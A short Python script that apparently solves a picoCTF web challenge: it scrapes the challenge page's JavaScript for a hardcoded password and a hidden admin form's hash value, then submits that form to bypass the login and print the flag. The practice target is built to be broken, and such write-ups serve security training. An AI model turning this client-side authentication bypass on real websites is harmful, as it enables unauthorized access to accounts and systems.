from urllib.parse import urljoin

import requests
import lxml.html
import re

resp = requests.get("http://saturn.picoctf.net:52682/")
doc = lxml.html.fromstring(resp.content)
form_action_url = doc.xpath("//form/@action")[0]

resp = requests.get(urljoin(resp.url, form_action_url))
doc = lxml.html.fromstring(resp.content)
scripts = doc.xpath("//script")
admin_form_hash_id = None
admin_form_hash_value = None
admin_form_id = None
for s in scripts:
    if s.attrib.get("src"):
        password = re.search("password === '(.+)'",
                             requests.get(urljoin(resp.url, s.attrib["src"])).text,
                             re.MULTILINE).group(1)
    else:
        admin_form_hash_id, admin_form_hash_value = re.search(r"document.getElementById\('(.+)'\).value = \"(.+)\";",
                                                                s.text,
                                                                re.MULTILINE).groups()
        admin_form_id = re.search(r"document.getElementById\('(.+)'\).submit\(\);",
                                  s.text,
                                  re.MULTILINE).group(1)
assert all([admin_form_id, admin_form_hash_id, admin_form_hash_value])
admin_form_hash_name = doc.xpath(f"//input[@id='{admin_form_hash_id}']/@name")[0]
admin_form = doc.xpath(f"//form[@id='{admin_form_id}']")[0]
method = admin_form.attrib.get("method", "get")
resp = requests.request(method,
                        urljoin(resp.url, admin_form.attrib.get("action", "")),
                        **{("params" if method == "get" else "data"): {admin_form_hash_name: admin_form_hash_value}})
doc = lxml.html.fromstring(resp.content)
flag = doc.xpath("/html/body/text()")[0].strip()

print(flag)
